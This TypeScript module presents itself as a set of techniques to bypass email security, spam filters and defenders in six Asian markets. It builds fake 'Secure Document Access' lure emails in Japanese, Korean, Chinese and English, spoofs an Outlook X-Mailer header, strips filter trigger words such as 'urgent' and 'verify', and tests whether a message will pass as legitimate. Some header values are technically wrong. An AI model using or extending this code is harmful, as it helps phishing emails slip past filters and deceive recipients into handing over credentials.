// Asia-Specific Evasion Techniques
// Techniques to bypass Asia email security, spam filters, and defenders

/**
 * Evasion techniques specific to Asia:
 * - Japan: Proper UTF-8 encoding, Japanese email format
 * - Korea: EUC-KR or UTF-8, Korean email standards
 * - China: GB2312/GBK/UTF-8, Chinese email standards
 * - Singapore/Taiwan/Hong Kong: Proper encoding, clean structure
 */

// Generate legitimate email for Asia
export function generateLegitimateAsiaEmail(country: string): {
  headers: Record<string, string>
  encoding: string
  charset: string
  language: string
} {
  const configs: Record<string, {
    encoding: string
    charset: string
    language: string
  }> = {
    JP: {
      encoding: 'UTF-8',
      charset: 'UTF-8',
      language: 'ja-JP',
    },
    KR: {
      encoding: 'UTF-8',
      charset: 'UTF-8',
      language: 'ko-KR',
    },
    CN: {
      encoding: 'UTF-8',
      charset: 'UTF-8',
      language: 'zh-CN',
    },
    SG: {
      encoding: 'UTF-8',
      charset: 'UTF-8',
      language: 'en-SG',
    },
    TW: {
      encoding: 'UTF-8',
      charset: 'UTF-8',
      language: 'zh-TW',
    },
    HK: {
      encoding: 'UTF-8',
      charset: 'UTF-8',
      language: 'zh-HK',
    },
  }
  
  const config = configs[country.toUpperCase()] || configs.SG
  
  return {
    headers: {
      'Content-Type': `text/html; charset=${config.charset}`,
      'Content-Transfer-Encoding': config.encoding,
      'X-Language': config.language,
      'X-Country': country.toUpperCase(),
    },
    encoding: config.encoding,
    charset: config.charset,
    language: config.language,
  }
}

// Avoid spam filter patterns (Asia-specific)
export const ASIA_SPAM_PATTERNS = [
  // Japanese spam patterns
  '緊急', // Urgent
  '今すぐ', // Immediately
  'クリック', // Click
  '確認', // Verify
  
  // Korean spam patterns
  '긴급', // Urgent
  '지금', // Now
  '클릭', // Click
  '확인', // Verify
  
  // Chinese spam patterns
  '紧急', // Urgent
  '立即', // Immediately
  '点击', // Click
  '验证', // Verify
]

// Check if content contains Asia spam patterns
export function containsAsiaSpamPatterns(content: string): boolean {
  const lowerContent = content.toLowerCase()
  return ASIA_SPAM_PATTERNS.some(pattern => 
    content.includes(pattern) || lowerContent.includes(pattern.toLowerCase())
  )
}

// Sanitize content for Asia
export function sanitizeAsiaContent(content: string, country: string): string {
  let sanitized = content
  
  // Remove spam patterns
  ASIA_SPAM_PATTERNS.forEach(pattern => {
    const regex = new RegExp(pattern, 'gi')
    sanitized = sanitized.replace(regex, '')
  })
  
  // Ensure proper encoding
  try {
    // Validate UTF-8 encoding
    Buffer.from(sanitized, 'utf8').toString('utf8')
  } catch {
    // Fix encoding issues
    sanitized = Buffer.from(sanitized, 'latin1').toString('utf8')
  }
  
  return sanitized.trim()
}

// Generate legitimate Asia email structure
export function generateAsiaEmailStructure(country: string): {
  subject: string
  from: string
  body: string
  headers: Record<string, string>
} {
  const config = generateLegitimateAsiaEmail(country)
  
  const subjects: Record<string, string> = {
    JP: 'セキュアなドキュメントアクセス',
    KR: '보안 문서 액세스',
    CN: '安全文档访问',
    SG: 'Secure Document Access',
    TW: '安全文件存取',
    HK: '安全文件存取',
  }
  
  const bodies: Record<string, string> = {
    JP: `
      <p>お客様</p>
      <p>セキュアなドキュメントへのアクセスがリクエストされました。以下のリンクから安全にアクセスしてください。</p>
      <p><a href="#">セキュアドキュメントにアクセス</a></p>
      <p>このリンクはセキュリティのため24時間で有効期限が切れます。</p>
      <p>このリクエストをしていない場合は、このメールを無視してください。</p>
      <p>よろしくお願いいたします<br>セキュリティチーム</p>
    `,
    KR: `
      <p>고객님</p>
      <p>보안 문서에 대한 액세스가 요청되었습니다. 아래 링크를 사용하여 안전하게 액세스하세요.</p>
      <p><a href="#">보안 문서 액세스</a></p>
      <p>이 링크는 보안상의 이유로 24시간 후 만료됩니다.</p>
      <p>이 요청을 하지 않은 경우 이 이메일을 무시하세요.</p>
      <p>감사합니다<br>보안팀</p>
    `,
    CN: `
      <p>尊敬的客户</p>
      <p>您已请求访问安全文档。请使用下面的链接安全地访问。</p>
      <p><a href="#">访问安全文档</a></p>
      <p>此链接出于安全原因将在24小时后过期。</p>
      <p>如果您未请求此访问，请忽略此邮件。</p>
      <p>此致<br>安全团队</p>
    `,
    SG: `
      <p>Dear User,</p>
      <p>You have requested access to a secure document. Please use the link below to access your document securely.</p>
      <p><a href="#">Access Secure Document</a></p>
      <p>This link will expire in 24 hours for security purposes.</p>
      <p>If you did not request this access, please ignore this email.</p>
      <p>Best regards,<br>Security Team</p>
    `,
    TW: `
      <p>親愛的用戶</p>
      <p>您已請求訪問安全文件。請使用下面的連結安全地訪問。</p>
      <p><a href="#">訪問安全文件</a></p>
      <p>此連結出於安全原因將在24小時後過期。</p>
      <p>如果您未請求此訪問，請忽略此郵件。</p>
      <p>此致<br>安全團隊</p>
    `,
    HK: `
      <p>親愛的用戶</p>
      <p>您已請求訪問安全文件。請使用下面的連結安全地訪問。</p>
      <p><a href="#">訪問安全文件</a></p>
      <p>此連結出於安全原因將在24小時後過期。</p>
      <p>如果您未請求此訪問，請忽略此郵件。</p>
      <p>此致<br>安全團隊</p>
    `,
  }
  
  return {
    subject: subjects[country.toUpperCase()] || subjects.SG,
    from: 'noreply@domain.com',
    body: bodies[country.toUpperCase()] || bodies.SG,
    headers: {
      ...config.headers,
      'X-Mailer': 'Microsoft Outlook 16.0',
      'X-Priority': '3',
      'Message-ID': generateMessageID(),
      'Date': new Date().toUTCString(),
      'MIME-Version': '1.0',
    },
  }
}

// Generate Message-ID
function generateMessageID(): string {
  const timestamp = Date.now()
  const random = Math.random().toString(36).substring(2, 15)
  return `<${timestamp}.${random}@domain.com>`
}

// Check if email appears legitimate for Asia
export function appearsLegitimateAsia(
  headers: Record<string, string>,
  content: string,
  country: string
): boolean {
  const config = generateLegitimateAsiaEmail(country)
  
  // Check encoding
  const hasCorrectEncoding = headers['Content-Type']?.includes(config.charset)
  
  // Check for spam patterns
  const hasSpamPatterns = containsAsiaSpamPatterns(content)
  
  // Check structure
  const hasProperStructure = content.includes('<html') && content.includes('</html>')
  
  // Check language header
  const hasLanguageHeader = headers['X-Language'] === config.language
  
  return (
    hasCorrectEncoding &&
    !hasSpamPatterns &&
    hasProperStructure &&
    hasLanguageHeader
  )
}











